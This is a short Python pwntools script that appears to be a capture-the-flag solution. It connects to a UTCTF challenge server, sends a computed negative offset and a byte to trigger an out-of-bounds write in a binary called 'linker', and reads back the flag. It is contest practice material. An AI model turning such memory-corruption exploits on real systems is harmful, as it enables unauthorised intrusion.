#!/usr/bin/python
import pwn

# z = pwn.process("./linker")
z = pwn.remote('pwn.utctf.live', 5433)
addr_offset = (0x510 + 10 - 0x3458)

print(z.recvuntil("one of the values\n"))

z.sendline("%d" % addr_offset)
z.sendline("%d" % ord("2"))
print(z.recvline())
print(z.recvuntil("}"))